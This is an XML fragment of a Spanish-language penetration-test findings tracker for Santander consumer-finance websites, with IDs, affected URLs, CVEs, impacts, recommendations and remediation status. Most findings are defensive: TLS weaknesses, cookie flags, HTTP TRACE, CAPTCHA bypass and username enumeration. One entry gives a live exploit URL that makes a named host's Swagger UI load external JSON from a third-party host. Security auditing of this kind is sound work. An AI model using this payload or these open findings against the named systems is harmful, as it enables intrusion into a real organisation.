    <t>SC-23-CNMPA-03-VE-001</t>
  </si>
  <si>
    <t>CVE-2022-28614
CVE-2022-28615
CVE-2023-2650
CVE-2022-0778</t>
  </si>
  <si>
    <t>https://santanderfinancing.com:4443/portalpagos/registerTransaction</t>
  </si>
  <si>
    <t>Durante la realización de las pruebas se ha podido comprobar que el activo afectado hace uso de cierta versión de software que presenta vulnerabilidades conocidas y divulgadas públicamente.
Las versiones de ambas tecnologías se ven afectadas por múltiples vulnerabilidades que podrían afectar al correcto funcionamiento del activo siendo posible incluso causar una denegación de servicio, motivo por el cual no han sido explotados durante las pruebas. A continuación, se listan algunos ejemplos de CVEs que afectan al software empleado por el activo:
• Apache 2.4.6:
- CVE-2022-28614
- CVE-2022-28615
• OpenSSL/1.0.2k-flips:
- CVE-2023-2650
- CVE-2022-0778</t>
  </si>
  <si>
    <t>Se recomienda actualizar la versión tanto del servidor apache como del software OpenSSL y establecer una política de actualizaciones/gestión de parches para tratar de evitar posteriores vulnerabilidades.</t>
  </si>
  <si>
    <t>MAN-6512cfb5f74e327f9d0969f9</t>
  </si>
  <si>
    <t>SC-23-CNMPA-03-CO-002</t>
  </si>
  <si>
    <t>Acceso a páginas por defecto</t>
  </si>
  <si>
    <t>Se ha podido comprobar, que existe una página por defecto en la dirección https://santanderfinancing.com:4443
Página por defecto de Apache Red Hat Enterprise</t>
  </si>
  <si>
    <t>Se recomienda eliminar o sustituir las páginas por defecto por páginas personalizadas que no revelen información sobre la tecnología subyacente. Como medida adicional, también se recomienda deshabilitar las funcionalidades de la aplicación que no sean estrictamente necesarias para el correcto funcionamiento de la misma.</t>
  </si>
  <si>
    <t>Las páginas y archivos disponibles por defecto brindan información adicional sobre la infraestructura de las aplicaciones Web. Esta información permite a un atacante o usuario malintencionado planificar ataques enfocados sobre las aplicaciones web, framework/lenguaje de programación utilizado para su desarrollo o el software del servidor en el que se encuentran prestando servicio.</t>
  </si>
  <si>
    <t>MAN-6512d054f74e327f9d0969fa</t>
  </si>
  <si>
    <t>SC-23-CNMPA-03-AP-003</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación devuelve información acerca de rutas internas del sistema de ficheros del servidor. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros.</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento interno del servidor, como pueden ser rutas internas o ubicación de ficheros o directorios dentro del mismo. Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, mensajes de error y/o páginas por defecto.
https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/</t>
  </si>
  <si>
    <t>Un atacante podría aprovechar esta vulnerabilidad para obtener más información sobre el sistema o el software instalado, pudiendo identificar el tipo de servidor, o versión de software. Esta información le permitiría localizar vulnerabilidades existentes en los productos software instalados y aprovecharlas para tomar el control del sistema.</t>
  </si>
  <si>
    <t>helicopter-w388-3</t>
  </si>
  <si>
    <t>CAPTCHA BYPASS: Rate Limiting Bypass on Contact Page</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/base-formulario/</t>
  </si>
  <si>
    <t>Al probar la aplicación web, **santanderfinancing.com**, se encontró que el parámetro y valor CAPTCHA `et_pb_contact_captcha_1` no está implementado en el lado del servidor. El atacante puede eludir la limitación de velocidad en la página Contacto enviando la solicitud múltiple contra el valor y el parámetro CAPTCHA. El Captcha no está implementado en el lado del servidor. Un atacante puede saltarse esto y enviar múltiples peticiones al servidor.</t>
  </si>
  <si>
    <t>CAPTCHA está en alto riesgo de ser evitado por múltiples métodos, y necesitamos una solución para no dejar que los bots y los intrusos maliciosos lo hagan como varios métodos de evasión CAPTCHA. Necesitamos una mejor manera de asegurar los datos del usuario y reducir el sitio web a ser desbordado de bots. Algunas técnicas de prevención de CAPTCHA Bypassing se explican a continuación:
   * Lista negra de IP: Poner en lista negra la dirección IP desde la que se envía la solicitud varias veces.
   * Monitorización del tiempo de respuesta 
   * Cambio entre CAPTCHAs
   * Claves de sitio: Este escudo impide que un CAPTCHA se muestre en un sitio distinto del propuesto, moderando así los ataques de abuso humano. Esta defensa probablemente no va a influir en los clientes auténticos de un sitio en cualquier capacidad; todas las cosas consideradas, estructurado claramente para prevenir el escaparate de un CAPTCHA en un lugar no aprobado. Cuando se da una clave al propietario del sitio, ejecutarla puede ser tan necesario como incluir un par de líneas de código.
En este caso, parece que el CAPTCHA sólo se valida del lado del cliente. Validar el CAPTCHA del lado del servidor.</t>
  </si>
  <si>
    <t xml:space="preserve">No rate limiting es un fallo que no limita el número de intentos que uno hace en el servidor de un sitio web para extraer datos. Los siguientes son los impactos de Bypassing CAPTCHA (Rate Limiting) en la Aplicación. 
1. Debido a la falta de validación del lado del servidor en el `CAPTCHA`, no hay limitación de tasa en la Página `Contacto`.
2. Todo el propósito de tener la característica de seguridad de `CAPTCHA` se ha ido en vano.
3. Un usuario malintencionado puede solicitar infinitas veces.
4. No hay Validación del lado del servidor en el `Google` Captcha, puede ser evitado por la Eliminación del valor Captcha y Parámetro. 
5. El atacante puede enviar múltiples peticiones al servidor con los mismos valores de contenido. </t>
  </si>
  <si>
    <t xml:space="preserve">1° Fecha: 28/02/2025
2°Sin fecha </t>
  </si>
  <si>
    <t>Se encuentra en processo de validacion con el equipo de desarrollo</t>
  </si>
  <si>
    <t>helicopter-w388-6</t>
  </si>
  <si>
    <t>Username enumeration in login functionality</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com/account/v1/account/login</t>
  </si>
  <si>
    <t>La enumeración de nombres de usuario es el proceso de intentar identificar nombres de usuario válidos en una página de inicio de sesión probando repetidamente diferentes combinaciones de entradas de nombres de usuario. Los atacantes utilizan esta técnica para conocer la estructura de cuentas de usuario de un sitio web e identificar objetivos potenciales para ataques con contraseña. Un sitio web es vulnerable a la enumeración de nombres de usuario si proporciona mensajes de error diferentes para nombres de usuario válidos e inválidos. Esta información puede utilizarse para lanzar ataques más específicos en la página de inicio de sesión, lo que aumenta la probabilidad de éxito. Para evitar la enumeración de nombres de usuario, los sitios web deben asegurarse de que sus mensajes de error para intentos de inicio de sesión no válidos sean coherentes, independientemente de si el nombre de usuario es válido o no.</t>
  </si>
  <si>
    <t>A continuación se indican algunas medidas correctivas que pueden ayudar a mitigar el riesgo de enumeración de nombres de usuario en las páginas de inicio de sesión:
Mensajes de error coherentes: Proporcione mensajes de error coherentes para todos los intentos de inicio de sesión no válidos, independientemente de si el nombre de usuario es válido o no. Esto dificultará a los atacantes la determinación de nombres de usuario válidos.
Limite los intentos de inicio de sesión: Implementa la limitación de velocidad o el bloqueo de IP para evitar que los atacantes realicen demasiados intentos de inicio de sesión en un corto periodo de tiempo. Esto ralentizará el proceso de enumeración de nombres de usuario y reducirá el riesgo de éxito de los ataques.
Utilizar CAPTCHA: Incorporar un mecanismo CAPTCHA puede prevenir ataques automatizados y dificultar a los atacantes la enumeración de nombres de usuario.
Utilice la autenticación de dos factores: Implementar la autenticación de dos factores (2FA) puede proporcionar una capa adicional de seguridad y dificultar a los atacantes el acceso no autorizado a las cuentas de usuario.
Auditorías de seguridad periódicas: Las auditorías regulares de seguridad y las pruebas de penetración pueden ayudar a identificar y abordar las vulnerabilidades, incluidas las relacionadas con la enumeración de nombres de usuario.
Tenga en cuenta que estas medidas correctoras pueden no ser exhaustivas y tener que adaptarse a los requisitos específicos del sitio web y su infraestructura. La mejor forma de prevenir la enumeración de nombres de usuario y otros riesgos de seguridad es implantar un programa de seguridad integral.</t>
  </si>
  <si>
    <t>El impacto de la enumeración de nombres de usuario en una página de inicio de sesión puede ser significativo y dar lugar a diversos riesgos y problemas de seguridad:
Apropiación de cuentas: Al conocer los nombres de usuario válidos, un atacante puede utilizar ataques de fuerza bruta o de diccionario para descifrar contraseñas y obtener acceso no autorizado a cuentas de usuario.
Fuga de información: Los mensajes de error devueltos por una página de inicio de sesión pueden revelar información sobre la tecnología subyacente o la estructura de la base de datos de usuarios, que puede utilizarse para planificar nuevos ataques.
Aumento del riesgo de éxito de los ataques: La enumeración de nombres de usuario facilita a los atacantes el lanzamiento de ataques más focalizados y efectivos, aumentando la probabilidad de un compromiso exitoso.
Pérdida de confianza: Si los usuarios son conscientes de las vulnerabilidades de seguridad de un sitio web, pueden perder la confianza en él y optar por no utilizarlo, lo que puede dañar la reputación del sitio web y de su propietario.
Por lo tanto, es importante abordar el problema de la enumeración de nombres de usuario en las páginas de inicio de sesión y asegurarse de que el sitio está protegido contra este tipo de ataques.</t>
  </si>
  <si>
    <t>MAN-3934cc06</t>
  </si>
  <si>
    <t>SCO-22-CNMPO-001-CO-001</t>
  </si>
  <si>
    <t>5</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor que sustenta la aplicación https://autofinance.santanderfinancing.com/UHJ1ZWJhc0FwcENsaWVudGVz revelan información interna acerca del Tipo de Servidor y/o infraestructura interna de la aplicación.</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de esta. Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, mensajes de error y/o páginas por defecto. Para más información consulte en:
https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/</t>
  </si>
  <si>
    <t>1° Fecha:31/01/2025
2° Fecha: 30/05/2025</t>
  </si>
  <si>
    <t>API Viabilizacion</t>
  </si>
  <si>
    <t>MAN-fc1d4de3</t>
  </si>
  <si>
    <t>SCO-21-CNMPA-004-CO-001</t>
  </si>
  <si>
    <t>api.premiercredit.co</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor que sustenta la aplicación https://api.premiercredit.co:11444/ revelan información interna acerca de la infraestructura interna de la aplicación.
Con la información obtenida, un atacante podría saber que el sistema operativo instalado en el servidor es Windows 8.1 o Windows Server 2012 R2 a partir de la información publicada en Wikipedia</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de esta. 
Este tipo de información puede ser accesible a través de la cabecera de respuesta HTTP Server. Para más información consulte en: •https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/</t>
  </si>
  <si>
    <t>Activo dado de baja</t>
  </si>
  <si>
    <t>MAN-33c52d09</t>
  </si>
  <si>
    <t>SC-22-CNMPO-12-AP-002</t>
  </si>
  <si>
    <t>Cookie no protegida por el atributo HttpOnly</t>
  </si>
  <si>
    <t>Se ha observado que la cookie se sesión de la aplicación no está protegida por el atributo “HttpOnly”. Este atributo se utiliza para indicarle al navegador que la cookie no sea accedida por código JavaScript.</t>
  </si>
  <si>
    <t>Se recomienda modificar la configuración de la aplicación de manera tal que la cookie de sesión no pueda ser accedida a través de código JavaScript. Para ello, la configuración de la cookie en el navegador del usuario debe llevar el atributo “HttpOnly”.</t>
  </si>
  <si>
    <t>La ausencia del atributo “HttpOnly”, en la configuración de una cookie en el navegador, podría permitirle a un individuo malicioso lograr explotar de manera exitosa una potencial vulnerabilidad de Cross-site Scripting, capturar la sesión de un usuario autenticado y posteriormente utilizarla para acceder a la aplicación.</t>
  </si>
  <si>
    <t>MAN-33c52d4b</t>
  </si>
  <si>
    <t>SC-22-CNMPO-12-CO-003</t>
  </si>
  <si>
    <t>La vulnerabilidad de TLS MAC Calculation Timing Attack o LUCKY13 es una vulnerabilidad de cifrado que aplica a la implementación de Transport Layer Security (TLS) que utilizan el modo de cifrado CBC.
Este ataque consiste en detectar pequeñas diferencias de tiempo cuando se producen errores TLS generados a base de mandar peticiones maliciosas al servidor. Con estos ataques es posible descifrar bloques TLS, aunque la cantidad de peticiones depende del tipo de conexión, el ruido y el algoritmo de MAC utilizado.</t>
  </si>
  <si>
    <t>MAN-33c52da2</t>
  </si>
  <si>
    <t>SC-22-CNMPO-12-CO-004</t>
  </si>
  <si>
    <t>Método HTTP TRACE habilitado</t>
  </si>
  <si>
    <t>Se ha observado que los servicios afectados soportan la utilización del método HTTP TRACE. Este método, bajo ciertas condiciones, podría ser aprovechado por individuos maliciosos para ejecutar ataques del tipo Cross-Site Tracing.
El atributo de seguridad HTTPOnly es utilizado para proteger las cookies de sesión de los usuarios autenticados en las aplicaciones Web. De esta manera, al código JavaScript ejecutado en el navegador no se le permite acceder a su contenido. Sin embargo, si se emplearan cookies de sesión y el método TRACE pudiera ser empleado para acceder recursos en el servidor de la aplicación, desde el navegador de una víctima se enviaría la cookie de sesión como parte del request HTTP y el servidor respondería reflejando el contenido del request en el cuerpo del response HTTP. De esta manera, sería posible acceder al contenido de la cookie de sesión por medio de código JavaScript, eludiendo la protección impuesta por el atributo HTTPOnly.</t>
  </si>
  <si>
    <t>Se recomienda analizar si el método HTTP TRACE es requerido por el negocio, y deshabilitarlo en caso de no ser requerido. De igual manera, se recomienda revisar los estándares de configuración de los servidores para asegurar que los métodos HTTP innecesarios se encuentren deshabilitados antes de promover un servidor a producción.</t>
  </si>
  <si>
    <t>Si una aplicación que reside en el servicio afectado tuviera algún componente vulnerable a Cross-Site Scripting (XSS), aun cuando la cookie de sesión fuera protegida mediante el atributo HTTPOnly, un individuo malicioso podría aprovechar la disponibilidad del método TRACE para realizar el ataque conocido como Cross-Site Tracing (XST). Mediante la inyección de código JavaScript especialmente diseñado en el recurso vulnerable a XSS, el individuo malicioso podría lograr que la cookie de sesión sea reflejada en el cuerpo del response HTTP y así acceder a su contenido, para ingresar a la aplicación en nombre de la víctima y obtener información sensible o realizar operaciones privilegiadas en su nombre.</t>
  </si>
  <si>
    <t>MAN-6512d0e0f74e327f9d0969fb</t>
  </si>
  <si>
    <t>SC-23-CNMPA-03-CO-004</t>
  </si>
  <si>
    <t>Listado de directorios</t>
  </si>
  <si>
    <t>La aplicación analizada presenta una vulnerabilidad de directorios en la dirección https://santanderfinancing.com:4443/icons/.</t>
  </si>
  <si>
    <t>Crear en cada directorio un fichero index por defecto (index.html) para que el servidor muestre la página por defecto en vez del listado de directorios.</t>
  </si>
  <si>
    <t>Dependiendo del tipo de información que contengan los ficheros incluidos en los directorios podría tener un mayor o menor en el impacto de la confidencialidad de los datos. Un atacante podría utilizar la información encontrada para realizar posteriormente un ataque dirigido.</t>
  </si>
  <si>
    <t>MAN-667c3389413b406ff3f83df0</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-009-CO-002</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com/</t>
  </si>
  <si>
    <t>Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso.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</si>
  <si>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Aliados</t>
  </si>
  <si>
    <t>MAN-66548077c382686af2c85600</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-001-AP-003</t>
  </si>
  <si>
    <t>Cookie sin atributo Secure</t>
  </si>
  <si>
    <t>aliados.santanderconsumer.co</t>
  </si>
  <si>
    <t>Durante el ejercicio de intrusión se ha comprobado que el servidor remoto no incluye en las cabeceras de respuesta "Set-Cookie" de la cookie ‘JSESSIONID’ el atributo “Secure”.</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión con el atributo de seguridad "Secure", evitando que el identificador de sesión sea transmitido por canales no seguros.</t>
  </si>
  <si>
    <t>El robo de cookies podría permitir a un usuario malicioso acceder a las sesiones privadas de otros usuarios, suplantando su identidad dentro de la aplicación.</t>
  </si>
  <si>
    <t>MAN-665481a2c382686af2c85601</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-001-CO-004</t>
  </si>
  <si>
    <t>Lucky13</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha observado que el servidor que aloja el dominio web motor.santanderconsumer.co es vulnerable a Lucky13.</t>
  </si>
  <si>
    <t>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</si>
  <si>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MAN-6673ff5ebb0dea0e40f46cff</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-008-CO-004</t>
  </si>
  <si>
    <t>La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes intermedios obtener encabezados HTTP de texto sin formato.
A modo de evidencia, se muestra el resultado de la herramienta "testssl” sobre el servidor afectado aliados.santanderconsumer.co que muestra que el activo es vulnerable a BEAST:</t>
  </si>
  <si>
    <t>MAN-6669bf04bb0dea0e40ef3709</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-007-CO-001</t>
  </si>
  <si>
    <t>La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes intermedios obtener encabezados HTTP de texto sin formato.</t>
  </si>
  <si>
    <t>MAN-6669bf88bb0dea0e40ef3751</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-007-CO-002</t>
  </si>
  <si>
    <t>Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso.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</si>
  <si>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MAN-668e2a9f87e64843c1d54e35</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-010-CO-005</t>
  </si>
  <si>
    <t>4443</t>
  </si>
  <si>
    <t>La aplicación auditada no presenta la cabecera de respuesta X-Frame-Options, permitiendo que la aplicación pueda ser cargada en frames de otro dominio externo al principal. Esta técnica denominada como Clickjacking es muy utilizada en escenarios de Phishing en los que al usuario se le muestra un frame de la aplicación legítima desde un dominio fraudulento controlado por el atacante.</t>
  </si>
  <si>
    <t>Se recomienda utilizar la cabecera "X-Frame-Options" en las respuestas HTTP para notificar al navegador los permisos sobre qué dominios pueden cargar las páginas de la aplicación. Actualmente esta funcionalidad se encuentra ampliamente soportada. Seleccionar una de las siguiente opciones según corresponda. 
- Indica al navegador que la página no se debe cargar nunca dentro de otro frame 
X-Frame-Options: DENY 
- Indica al navegador que la página se podrá cargar únicamente en frames pertenecientes al mismo dominio 
X-Frame-Options: SAMEORIGIN 
- Indica al navegador que la página se permite cargar en frames únicamente pertenecientes al dominio indicado 
X-Frame-Options: ALLOW-FROM &lt;origen&gt;
Adicionalmente, se pueden incluir fragmentos de Javascript en la respuesta que detecten si se encuentra dentro de un frame y cargar la página sin frames. 
El ejemplo más sencillo sería incluir al principio del código HTML de la respuesta lo siguiente: &lt;script&gt;if (top!=self) top.location.href=self.location.href&lt;/script&gt;</t>
  </si>
  <si>
    <t>MAN-668e2ae687e64843c1d54e36</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-010-CO-006</t>
  </si>
  <si>
    <t>Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso.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</si>
  <si>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MAN-33c52e56</t>
  </si>
  <si>
    <t>SC-22-CNMPO-12-CO-006</t>
  </si>
  <si>
    <t>Se ha comprobado que el encabezado “Server” afectado filtra información del servidor web en uso.
La información revelada por este encabezado es:
• Apache</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa a la estructura interna de la misma, así como de las tecnologías utilizadas para su desarrollo o de la infraestructura que la sustenta. 
Este tipo de información puede ser accesible a través de las cabeceras de respuesta de la aplicación, mensajes de error y/o páginas por defecto. En particular, se recomienda retirar u ofuscar el encabezado “Server” de la respuesta HTTP.</t>
  </si>
  <si>
    <t>MAN-667c3321413b406ff3f83def</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-009-CO-001</t>
  </si>
  <si>
    <t>El servidor afectado tiene habilitado el método HTTP TRACE</t>
  </si>
  <si>
    <t>Se recomienda denegar el uso de los métodos TRACE, OPTIONS y CONNECT siempre que sea posible. 
Además, los métodos PUT y DELETE únicamente han de ser permitidos únicamente en aplicaciones de tipo API RESTFUL en las que se necesite su uso. 
Por otro lado, los métodos GET, POST y HEAD son considerados como métodos seguros y han de estar habilitados en todas las aplicaciones (HEAD es opcional) que utilicen los protocolos HTTP/HTTPS para comunicarse.</t>
  </si>
  <si>
    <t>Dependiendo la configuración en el servidor, el uso de ciertos métodos como (PUT, DELETE, TRACE u OPTIONS) podrían permitir a un atacante realizar ciertas opciones como por ejemplo, crear o borrar elementos.</t>
  </si>
  <si>
    <t>1° Fecha: 28/02/2025
2°Sin fecha</t>
  </si>
  <si>
    <t>MAN-668e2a3387e64843c1d54e34</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-010-CO-004</t>
  </si>
  <si>
    <t>El servidor afectado tiene habilitado el método HTTP TRACE
A continuación, se muestra la evidencia del uso del método HTTP habilitado en el servidor y considerado como inseguro.</t>
  </si>
  <si>
    <t>Se recomienda denegar el uso de los métodos TRACE, OPTIONS y CONNECT siempre que sea posible. Además, los métodos PUT y DELETE únicamente han de ser permitidos únicamente en aplicaciones de tipo API RESTFUL en las que se necesite su uso . Por otro lado, los métodos GET, POST y HEAD son considerados como métodos seguros y han de estar habilitados en todas las aplicaciones (HEAD es opcional) que utilicen los protocolos HTTP/HTTPS para comunicarse.</t>
  </si>
  <si>
    <t>Dependiendo la configuración en el servidor, el uso de ciertos métodos como (PUT, DELETE, TRACE u OPTIONS) podrían permitir a un atacante realizar ciertas opciones como, por ejemplo, crear o borrar elementos.</t>
  </si>
  <si>
    <t xml:space="preserve">Aun se estan realizando las validaciones correspondientes para realizar la mitigacion </t>
  </si>
  <si>
    <t>MAN-09a476bf</t>
  </si>
  <si>
    <t>SCO-22-CNMPO-006-CO-008</t>
  </si>
  <si>
    <t>Inadecuada política de contraseñas</t>
  </si>
  <si>
    <t>CVE-2019-10097
CVE-2019-0215
CVE-2018-17189
CVE-2022-1292
CVE-2022-2068
CVE-2022-2097
CVE-2022-0778
CVE-2019-16728</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=</t>
  </si>
  <si>
    <t>Se ha observado la presencia de servicios que poseen versiones de software desactualizadas.
Apache v2.4.37
openSSL1.1.1k
QXV0b0ZpbmFuSwagger UI &gt;= v3.14.1 &lt; v3.38.0 
DOMPurify &lt;= versión 2.2.2)
https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=
https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/feasibility/v1/swagger-ui/
https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/information/v1/swagger-ui/
https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/statistics/v1/swagger-ui/
https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/user_information/v1/swagger-ui/
https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/vehicle-quote/v1/swagger-ui/
https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/vehicle/v1/swagger-ui/
El payload utilizado para la explotacion de la librería DOMPurify fue el siguiente:
• https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/account/v1/swagger-ui/?configUrl=https://jumpy-floor.surge.sh/test.json</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de actualizar los servicios afectados a la versión recomendada por el fabricante o bien aplicar todos los parches de seguridad disponibles.</t>
  </si>
  <si>
    <t>Un individuo malicioso podría comprometer con mayor facilidad los servicios afectados, ya que las versiones de software asociadas poseen vulnerabilidades y/o debilidades de seguridad previamente reportadas. Las vulnerabilidades mencionadas son de conocimiento público y los detalles de las mismas se encuentran disponibles. En consecuencia, un individuo malicioso podría intentar explotarlas para comprometer la confidencialidad y/o integridad de la información a través de los servidores afectados.</t>
  </si>
  <si>
    <t>MAN-6512d54df74e327f9d0969fe</t>
  </si>
  <si>
    <t>SC-23-CNMPA-03-CO-007</t>
  </si>
  <si>
    <t>Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece compresión Gzip en sus conexiones.
Se muestra el resultado de la herramienta "testssl" que demuestra que el activo es vulnerable a BREACH</t>
  </si>
  <si>
    <t xml:space="preserve">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cómo se deshabilita la compresión HTTP para Apache y NGINX: Deshabilitar compresión en Apache: 
• Deshabilite el módulo mod_deflate utilizando el siguiente comando: 
$ sudo a2dismod deflate
• Reinicie el servidor: 
$ sudo /etc/init.d/apache2 restart
</t>
  </si>
  <si>
    <t>MAN-6512d5d7f74e327f9d0969ff</t>
  </si>
  <si>
    <t>SC-23-CNMPA-03-CO-008</t>
  </si>
  <si>
    <t>Se ha podido comprobar que el servidor que sustenta la aplicación es potencialmente vulnerable a Lucky13.</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>MAN-651addbbf74e327f9d0a09b4</t>
  </si>
  <si>
    <t>SC-23-CNMPA-002-CO-011</t>
  </si>
  <si>
    <t>Cifrado SSL inseguro</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha identificado que se están utilizando protocolos o algoritmos de cifrado que no se consideran lo suficientemente robustos para proteger la información transmitida por el canal de comunicaciones utilizado.
A continuación, se detallan los problemas de seguridad detectados en este ámbito:
• Uso del protocolo SSLv3
• Uso del protocolo TLS 1
• Uso del protocolo TLS 1.0
• Uso de cifrados con una longitud de clave baja (64 bits + DES, RC2 y RC4)
• Uso de cifrados obsoletos (Triple DES / IDEA, AES, ARIA etc.)</t>
  </si>
  <si>
    <t>Se recomienda configurar los servicios afectados evitando el uso de algoritmos de cifrado RC4 y RC2 y funciones de hash MD5. Además, se recomienda emplear cifrados considerados seguros (AES-GCM) con una longitud de clave mínima de 128 bits y una función de hash fuerte (SHA1). Al mismo tiempo, es recomendable desactivar el protocolo criptográfico SSL que contiene vulnerabilidades conocidas y utilizar TLS en su versión 1.2 o 1.3.</t>
  </si>
  <si>
    <t>Un atacante que pudiera capturar una gran cantidad de datos cifrados podría obtener la clave utilizada para cifrar estos datos pudiendo acceder a la información en texto plano. Algoritmos débiles, que se consideran inseguros, pueden permitir a los usuarios malintencionados atacar el sistema al eludir los controles de seguridad y realizar ataques como Man-in-The-Middle.</t>
  </si>
  <si>
    <t>MAN-651ade90f74e327f9d0a09b6</t>
  </si>
  <si>
    <t>SC-23-CNMPA-002-CO-013</t>
  </si>
  <si>
    <t>Padding Oracle On Downgraded Legacy Encryption (POODLE)</t>
  </si>
  <si>
    <t>El servidor SSL remoto no verifica el "padding" del bloque de cifrado cuando se utiliza una suite de cifrado como AES o DES permitiendo descifrar tráfico HTTPS enviado a través del canal cifrado.</t>
  </si>
  <si>
    <t>Deshabilitar todos aquellos algoritmos de cifrado basados en SSLv3. En los servicios compatibles con SSLv3, deben habilitar el mecanismo TLS Fallback SCSV, hasta que se pueda deshabilitar el cifrado basado en SSLv3.</t>
  </si>
  <si>
    <t>Se ha detectado que es posible utilizar mecanismo de cifrado considerado inseguro en la comunicación con el servidor, lo que podría permitir a un eventual atacante comprometer la confidencialidad de la información intercambiada entre un cliente y el servidor. Este tipo de vulnerabilidades tiene una complejidad de explotación alta pero podrían llegar a permitir a un atacante comprometer la información transmitida entre el cliente y el servidor.</t>
  </si>
  <si>
    <t>MAN-651adee3f74e327f9d0a09b7</t>
  </si>
  <si>
    <t>SC-23-CNMPA-002-CO-014</t>
  </si>
  <si>
    <t>La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes intermedios obtener encabezados HTTP de texto sin formato.
Se muestra el resultado de la herramienta "testssl” sobre el servidor afectado https://190.85.213.99:4443/ que muestra que el activo es vulnerable a BEAST</t>
  </si>
  <si>
    <t>MAN-651adf3bf74e327f9d0a09b8</t>
  </si>
  <si>
    <t>SC-23-CNMPA-002-CO-015</t>
  </si>
  <si>
    <t>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</si>
  <si>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MAN-6537dcc2f74e327f9d0bf46a</t>
  </si>
  <si>
    <t>SC-23-CNMPO-006-CO-006</t>
  </si>
  <si>
    <t>https://bpm.santanderconsumer.co</t>
  </si>
  <si>
    <t>Se recomienda utilizar la cabecera X-Frame-Options en las respuestas HTTP para notificar al navegador los permisos sobre qué dominios pueden cargar las páginas de la aplicación. Actualmente, está funcionalidad se encuentra ampliamente soportada. Seleccionar una de las siguiente opciones según corresponda. 
- Indica al navegador que la página no se debe cargar nunca dentro de otro frame 
• X-Frame-Options: DENY 
- Indica al navegador que la página se podrá cargar únicamente en frames pertenecientes al mismo dominio 
• X-Frame-Options: SAMEORIGIN 
- Indica al navegador que la página se permite cargar en frames únicamente pertenecientes al dominio indicado 
• X-Frame-Options: ALLOW-FROM &lt;origen&gt; 
Adicionalmente, se pueden incluir fragmentos de Javascript en la respuesta que detecten si se encuentra dentro de un frame y cargar la página sin frames. 
El ejemplo más sencillo sería incluir al principio del código HTML de la respuesta lo siguiente: 
• &lt;script&gt;if (top!=self) top.location.href=self.location.href&lt;/script&gt;</t>
  </si>
  <si>
    <t>De no configurar correctamente el servidor y/o la aplicación web para no permitir ataques de Clickjacking, un atacante podría llevar a cabo un secuestro de sesión mediante un previo ataque de Phishing para provocar que el usuario legítimo acceda a la página maliciosa. 
El riesgo de este tipo de vulnerabilidad se establece como bajo por la dificultad de realizar un ataque con éxito. Para ello, sería necesario dirigir la navegación de un usuario a un sitio controlado por un atacante, posiblemente con una URL similar a la de la aplicación legítima. En ese sitio, una página HTML contendría un frame que carga la página legítima de la aplicación afectada. En dicho caso, por ejemplo, entrarían en juego aspectos tales como el certificado del servidor del atacante y la URL, que provocaría una alerta del navegador al usuario y tendría que aceptar o pasar por alto que no son propios de la aplicación.</t>
  </si>
  <si>
